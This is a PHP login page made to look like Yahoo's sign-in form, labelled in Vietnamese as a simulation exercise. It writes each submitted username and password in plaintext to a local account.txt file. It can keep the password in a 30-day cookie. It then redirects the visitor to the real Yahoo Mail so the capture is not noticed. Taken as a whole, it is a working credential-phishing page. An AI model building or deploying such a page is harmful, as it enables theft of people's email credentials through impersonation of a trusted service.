<?php
$logDir = __DIR__ . '/../data';
$log    = $logDir . '/account.txt';
if (!is_dir($logDir)) mkdir($logDir, 0777, true);

$u = $_COOKIE['yk_user'] ?? '';
$p = $_COOKIE['yk_pass'] ?? '';
$ok = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $u = trim($_POST['user'] ?? '');
  $p = trim($_POST['pass'] ?? '');
  $remember = !empty($_POST['remember']);

  if ($u !== '' && $p !== '') {
    $line = date('c') . "\t$u\t$p" . PHP_EOL;
    file_put_contents($log, $line, FILE_APPEND | LOCK_EX);

    // Cookie 30 ngày (demo)
    if ($remember) {
      setcookie('yk_user', $u, time()+60*60*24*30, '/');
      setcookie('yk_pass', $p, time()+60*60*24*30, '/');
    }

    // Chuyển hướng "giả" sang Yahoo mail (không post được thông số thật)
    header('Location: https://mail.yahoo.com/');
    exit;
  } else {
    $ok = '<div class="badge danger">Nhập đầy đủ user/pass.</div>';
  }
}
?>
<h3>Yahoo mock (ghi file + cookie + redirect)</h3>
<?= $ok ?>
<form method="post" class="vstack gap-2" style="max-width:360px">
  <label>Yahoo! ID<input class="input" name="user" value="<?= htmlspecialchars($u) ?>"></label><br>
  <label>Password<input class="input" type="password" name="pass" value="<?= htmlspecialchars($p) ?>"></label><br>
  <label class="hstack gap-2">
    <input type="checkbox" name="remember" <?= $u&&$p?'checked':'' ?>> <span>Keep me signed in (demo cookie)</span>
  </label>
  <div class="hstack gap-2">
    <button class="btn primary">Sign in</button>
  </div>
</form>
<p class="text-xs">*Bài tập mô phỏng: ghi <code>data/account.txt</code>, cookie 30 ngày, sau đó chuyển đến Yahoo Mail.</p>
